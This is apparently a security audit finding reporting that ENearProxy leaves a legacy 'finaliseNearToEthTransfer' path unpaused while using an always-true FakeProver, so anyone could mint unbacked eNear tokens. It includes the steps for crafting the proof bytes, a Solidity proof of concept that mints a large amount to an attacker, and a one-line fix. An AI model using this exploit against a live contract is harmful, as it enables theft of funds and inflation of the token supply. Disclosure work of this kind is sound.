### Title
Unpaused Legacy `finaliseNearToEthTransfer` in ENearProxy with FakeProver Enables Unauthorized eNear Minting — (`evm/src/eNear/contracts/ENearProxy.sol`)

---

### Summary

`ENearProxy.initialize` never calls `_pause(PAUSED_LEGACY_FIN_TRANSFER)`. When ENearProxy is deployed with `FakeProver` as its `prover` (the intended production configuration per the README and test setup), the public `finaliseNearToEthTransfer` pass-through is live from block 0. Any unprivileged caller can supply attacker-crafted proof bytes, pass the always-true `FakeProver` check, and — because ENearProxy is the admin of the underlying `eNear` contract — bypass eNear's own pause and mint arbitrary eNear tokens to any address.

---

### Finding Description

`ENearProxy.initialize` sets `prover` to whatever address is passed in but never activates `PAUSED_LEGACY_FIN_TRANSFER`:

```solidity
// ENearProxy.sol lines 33-49
function initialize(
    address _eNear,
    address _prover,
    ...
) public initializer {
    __UUPSUpgradeable_init();
    __AccessControl_init();
    __Pausable_init();
    ...
    prover = INearProver(_prover);   // set to FakeProver in production
    // ← no _pause(PAUSED_LEGACY_FIN_TRANSFER) call
}
``` [1](#0-0) 

The legacy path is therefore open to any caller immediately after deployment:

```solidity
// ENearProxy.sol lines 80-90
function finaliseNearToEthTransfer(
    bytes memory proofData,
    uint64 proofBlockHeight
) external whenNotPaused(PAUSED_LEGACY_FIN_TRANSFER) {   // passes — flag never set
    require(
        prover.proveOutcome(proofData, proofBlockHeight), // FakeProver → always true
        "Proof should be valid"
    );
    eNear.finaliseNearToEthTransfer(proofData, proofBlockHeight); // mints tokens
}
``` [2](#0-1) 

`FakeProver` unconditionally returns `true` for every input:

```solidity
// FakeProver.sol lines 7-9
function proveOutcome(bytes calldata, uint64) external pure returns (bool) {
    return true;
}
``` [3](#0-2) 

The README explicitly documents that FakeProver is the intended production prover for `eNear`, and that ENearProxy is made the admin of `eNear`:

> "We will make `eNearProxy` the admin of `eNear` and replace the `Prover` with a `FakeProver` that will successfully verify any proof. We will pause the `finaliseNearToEthTransfer` and `transferToNear` functions…" [4](#0-3) 

The test suite confirms that once ENearProxy is the admin of `eNear`, it can call `eNear.finaliseNearToEthTransfer` **even when eNear's own pause flag is set** — the admin role bypasses eNear's internal pause:

```typescript
// eNearProxy.test.ts lines 126-140
await eNear.connect(eNearAdmin).adminPause(PAUSE_TRANSFER_TO_NEAR | PAUSE_FINALISE_FROM_NEAR)
// ...
await eNear.connect(eNearAdmin).adminSstore(9, zeroPadValue(eNearProxy.address, 32))
await eNearProxy.connect(alice).mint(...)          // succeeds — admin bypasses pause
expect(await eNear.balanceOf(alice.address)).to.equal(100)
``` [5](#0-4) 

The proof format is fully public from `ENearProxy.mint`. An attacker reads `nearConnector` (a public field) and `currentReceiptId`, then constructs:

```solidity
// ENearProxy.sol lines 58-69
bytes memory fakeProofData = bytes.concat(
    new bytes(72),
    hex"01000000",
    abi.encodePacked(currentReceiptId),
    new bytes(24),
    abi.encodePacked(Borsh.swapBytes4(uint32(nearConnector.length))),
    abi.encodePacked(nearConnector),
    hex"022500000000",
    abi.encodePacked(Borsh.swapBytes16(amount)),
    abi.encodePacked(to),
    new bytes(280)
);
``` [6](#0-5) 

The attacker substitutes their own `to` address and any `amount`, uses any receipt ID not yet consumed, and calls `ENearProxy.finaliseNearToEthTransfer`. All three guards fail open: ENearProxy's pause is unset, FakeProver returns true, and ENearProxy's admin status bypasses eNear's own pause.

---

### Impact Explanation

**Critical.** An unprivileged attacker can mint an unbounded quantity of eNear tokens to any address with no corresponding NEAR-side lock event. This inflates eNear supply without backing, enabling the attacker to dump tokens on the market or drain liquidity pools that price eNear against NEAR.

---

### Likelihood Explanation

**High.** The preconditions are the intended production state: FakeProver is the documented production prover, ENearProxy is the documented admin of eNear, and `PAUSED_LEGACY_FIN_TRANSFER` is unset by default. The proof format is fully reconstructible from the public `mint` function. No privileged access, leaked key, or off-chain coordination is required.

---

### Recommendation

`initialize` must activate `PAUSED_LEGACY_FIN_TRANSFER` unconditionally:

```solidity
function initialize(...) public initializer {
    ...
    prover = INearProver(_prover);
    _pause(PAUSED_LEGACY_FIN_TRANSFER);   // ← add this
    ...
}
```

This ensures the legacy path is never callable by external parties regardless of which prover is configured, matching the documented invariant that only ENearProxy (via `mint`) may trigger eNear minting. [1](#0-0)

### Proof of Concept

```solidity
// 1. Deploy FakeProver
FakeProver fakeProver = new FakeProver();

// 2. Deploy eNear with FakeProver (production setup)
eNear = deployENear(fakeProver);

// 3. Deploy ENearProxy with FakeProver — PAUSED_LEGACY_FIN_TRANSFER NOT set
ENearProxy proxy = deployProxy(eNear, fakeProver, nearConnector, 0, admin);

// 4. Set ENearProxy as admin of eNear (production step)
eNear.adminSstore(9, uint256(uint160(address(proxy))));

// 5. Attacker reads public fields and crafts proof
bytes memory craftedProof = abi.encodePacked(
    new bytes(72),
    hex"01000000",
    uint256(0),          // currentReceiptId = 0 (unused)
    new bytes(24),
    swapBytes4(uint32(nearConnector.length)),
    nearConnector,
    hex"022500000000",
    swapBytes16(1_000_000e24),  // large amount
    attackerAddress,
    new bytes(280)
);

// 6. Attacker calls the unguarded legacy path
proxy.finaliseNearToEthTransfer(craftedProof, 0);

// 7. Assert
assert(eNear.balanceOf(attacker) == 1_000_000e24);  // minted with no NEAR lock
```
